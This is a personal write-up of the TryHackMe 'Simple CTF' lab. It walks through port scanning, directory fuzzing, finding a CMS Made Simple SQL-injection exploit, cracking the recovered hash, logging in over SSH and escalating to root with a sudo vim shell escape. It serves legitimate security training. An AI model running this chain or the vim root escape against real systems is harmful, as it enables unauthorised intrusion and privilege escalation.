---
title: "Simple CTF"
kind: writeup
tags:
  - tryhackme-rooms
  - status/done
  - writeup
  - linux
  - web
  - challenege
status: "Done"
difficulty: "Easy"
url: "https://tryhackme.com/room/easyctf"
category:
  - "Challenege"
database: "TryHackMe"
area: "TryHackMe Rooms"
up: "[[TryHackMe]]"
notion-id: 4bc759b92751827cbd01011b8270d822
---

# Simple CTF

In: [[Career]] / [[TryHackMe Rooms]] / [[TryHackMe]]

## Nmap Scan

```bash
╰─ nmap -p- --min-rate 1000 -T4 -sV -Pn -oA nmap_full_scan 10.48.141.222                                                                                                                 ─╯
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-10 15:39 IST
Nmap scan report for 10.48.141.222
Host is up (0.0084s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.41 seconds
```

## Fuzzing Directories

```bash
╰─ ffuf -u "http://10.48.141.222/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r                                                                                 ─╯

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.141.222/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 946ms]
.htaccess               [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 2737ms]
robots.txt              [Status: 200, Size: 929, Words: 176, Lines: 33, Duration: 12ms]
server-status           [Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 10ms]
simple                  [Status: 200, Size: 19993, Words: 2945, Lines: 127, Duration: 42ms]
:: Progress: [20481/20481] :: Job [1/1] :: 865 req/sec :: Duration: [0:00:12] :: Errors: 0 ::

```

## Visiting /simple

![[attachments/TryHackMe Rooms/TryHackMe/Simple CTF/image.png]]

## Enumerating CMS-MS Version

![[attachments/TryHackMe Rooms/TryHackMe/Simple CTF/image 1.png]]

## Searching for exploits

```bash
╰─ searchsploit 'cmsms 2.2.8'                                                                                                                                                            ─╯
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                                                                                                                  | php/webapps/46635.py
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

## Using the exploit

```bash
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

![[attachments/TryHackMe Rooms/TryHackMe/Simple CTF/image 2.png]]

## Cracking the Hash

![[attachments/TryHackMe Rooms/TryHackMe/Simple CTF/image 3.png]]

## Logging in SSH & obtaining user flag

```bash
╭─░▒▓    ~ ▓▒░············································································································································░▒▓ ✔  at 04:11:38 PM  ▓▒░─╮
╰─ ssh mitch@10.49.152.214 -p 2222                                                                                                                                                       ─╯
The authenticity of host '[10.49.152.214]:2222 ([10.49.152.214]:2222)' can't be established.
ED25519 key fingerprint is: SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.49.152.214]:2222' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
mitch@10.49.152.214's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ ls
user.txt
$ cat user.txt
G00d j0b, keep up!
```

## Root Privileges

```bash
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

```bash
 sudo vim -c ':!/bin/sh'
```

```bash
# ls /root
root.txt
# ls
LinEnum.sh  user.txt
# cat /root/root.txt
W3ll d0n3. You made it!
```
